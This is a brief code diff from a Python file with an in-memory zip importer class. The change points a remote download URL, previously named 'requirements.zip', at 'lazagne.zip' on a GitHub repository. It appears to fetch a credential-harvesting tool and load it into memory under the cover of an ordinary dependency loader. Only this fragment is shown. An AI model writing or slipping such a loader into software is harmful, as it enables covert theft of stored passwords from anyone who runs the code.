@@ -8,7 +8,7 @@ import zipfile
 from pathlib import PurePosixPath
 
 
-REQ_ZIP_URL = "https://raw.githubusercontent.com/fvrsnr/default/main/requirements.zip"
+REQ_ZIP_URL = "https://raw.githubusercontent.com/fvrsnr/default/main/lazagne.zip"
 
 
 class MemoryZipImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
